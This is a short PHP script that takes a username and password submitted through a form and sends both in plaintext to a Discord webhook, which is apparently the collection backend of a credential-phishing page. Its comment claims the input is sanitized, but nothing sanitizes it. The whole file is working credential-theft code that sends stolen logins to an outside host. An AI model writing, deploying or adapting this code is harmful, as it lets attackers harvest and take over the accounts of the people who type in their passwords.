<?php
// Sanitize the input data
$username = $_POST['username'];
$password = $_POST['password'];

// Create the JSON payload
$payload = array(
    'content' => "New login detected!",
    'embeds' => array(
        array(
            'title' => "Login Details",
            'fields' => array(
                array(
                    'name' => 'Username',
                    'value' => $username,
                    'inline' => true
                ),
                array(
                    'name' => 'Password',
                    'value' => $password,
                    'inline' => true
                )
            )
        )
    )
);

// Send the JSON payload to the Discord webhook
$webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
?>
